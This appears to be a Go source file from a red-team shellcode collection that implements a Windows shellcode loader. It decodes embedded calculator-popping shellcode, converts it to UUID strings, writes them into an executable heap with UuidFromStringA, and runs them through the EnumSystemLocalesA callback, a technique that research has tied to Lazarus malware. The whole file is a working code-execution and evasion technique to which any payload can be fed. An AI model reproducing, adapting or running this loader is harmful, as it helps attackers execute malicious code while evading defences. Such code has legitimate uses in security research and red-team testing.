//go:build windows
// +build windows

// CREDIT: https://raw.githubusercontent.com/Ne0nd0g/go-shellcode/master/cmd/UuidFromString/main.go
// Concept pulled from https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

/*
	This program executes shellcode in the current process using the following steps:
		1. Create a Heap and allocate space
		2. Convert shellcode into an array of UUIDs
		3. Load the UUIDs into memory (on the allocated heap) by (ab)using the UuidFromStringA function
		4. Execute the shellcode by (ab)using the EnumSystemLocalesA function
*/

// Reference: https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala

package main

import (
	// Standard
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/google/uuid"
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	// Pop Calc Shellcode
	shellcode, err := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err))
	}

	// Convert shellcode to UUIDs
	if *debug {
		fmt.Println("[DEBUG]Converting shellcode to slice of UUIDs")
	}

	uuids, err := shellcodeToUUID(shellcode)
	if err != nil {
		log.Fatal(err.Error())
	}

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll & Rpcrt4.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading HeapCreate, HeapAlloc, EnumSystemLocalesA, and UuidToStringA procedures")
	}
	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")

	/* https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
		HANDLE HeapCreate(
			DWORD  flOptions,
			SIZE_T dwInitialSize,
			SIZE_T dwMaximumSize
		);
	  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	*/

	// Create the heap
	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))

	}

	if *verbose {
		fmt.Println(fmt.Sprintf("Heap created at: 0x%x", heapAddr))
	}

	/*	https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
		DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
		HANDLE hHeap,
		DWORD  dwFlags,
		SIZE_T dwBytes
		);
	*/

	// Allocate the heap
	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("Heap allocated: 0x%x", addr))
	}

	if *debug {
		fmt.Println("[DEBUG]Iterating over UUIDs and calling UuidFromStringA...")
	}

	/*
		RPC_STATUS UuidFromStringA(
		RPC_CSTR StringUuid,
		UUID     *Uuid
		);
	*/

	addrPtr := addr
	for _, uuid := range uuids {
		// Must be a RPC_CSTR which is null terminated
		u := append([]byte(uuid), 0)

		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
		}

		addrPtr += 16
	}
	if *verbose {
		fmt.Println("Completed loading UUIDs to memory with UuidFromStringA")
	}

	/*
		BOOL EnumSystemLocalesA(
		LOCALE_ENUMPROCA lpLocaleEnumProc,
		DWORD            dwFlags
		);
	*/

	// Execute Shellcode
	if *debug {
		fmt.Println("[DEBUG]Calling EnumSystemLocalesA to execute shellcode")
	}
	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
	}
	if *verbose {
		fmt.Println("Executed shellcode")
	}

}

// shellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
// converts the first 8 bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
func shellcodeToUUID(shellcode []byte) ([]string, error) {

	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// This seems unecessary or overcomplicated way to do this

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}

// export GOOS=windows GOARCH=amd64;go build -o UuidFromStringA.exe ./UuidFromStringA.go
